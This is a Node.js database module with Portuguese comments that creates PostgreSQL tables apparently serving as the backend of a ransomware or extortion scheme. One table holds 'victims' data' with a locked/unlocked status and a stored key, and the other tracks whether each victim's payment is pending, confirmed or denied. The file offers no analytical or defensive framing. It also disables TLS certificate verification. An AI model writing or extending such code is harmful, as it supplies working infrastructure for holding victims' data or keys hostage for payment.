// db.js
// Conexão com o PostgreSQL
// VERSÃO MANUAL: Sem automação de blockchain
// 
// Tabelas:
//   registros: id, status, chave
//   payment_requests: id (FK), status (pending/confirmed/denied), created_at, confirmed_at

require("dotenv").config();
const { Pool } = require("pg");

const url = process.env.DATABASE_URL || "";
const precisaSSL =
  process.env.PGSSL === "true" ||
  (process.env.PGSSL !== "false" && /render\.com|railway|neon\.tech|supabase/.test(url));

const pool = new Pool({
  connectionString: url,
  ssl: precisaSSL ? { rejectUnauthorized: false } : false,
});

async function initDb() {
  // Tabela de registros (dados das vítimas)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS registros (
      id TEXT PRIMARY KEY,
      status TEXT NOT NULL DEFAULT 'locked' CHECK (status IN ('locked', 'unlocked')),
      chave TEXT NOT NULL,
      criado_em TIMESTAMP DEFAULT NOW()
    );
  `);

  // Tabela de requisições de pagamento (notificações do usuário)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS payment_requests (
      id SERIAL PRIMARY KEY,
      user_id TEXT NOT NULL REFERENCES registros(id) ON DELETE CASCADE,
      status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'confirmed', 'denied')),
      notificado_em TIMESTAMP DEFAULT NOW(),
      confirmado_em TIMESTAMP DEFAULT NULL,
      UNIQUE(user_id)
    );
  `);
}

module.exports = { pool, initDb };
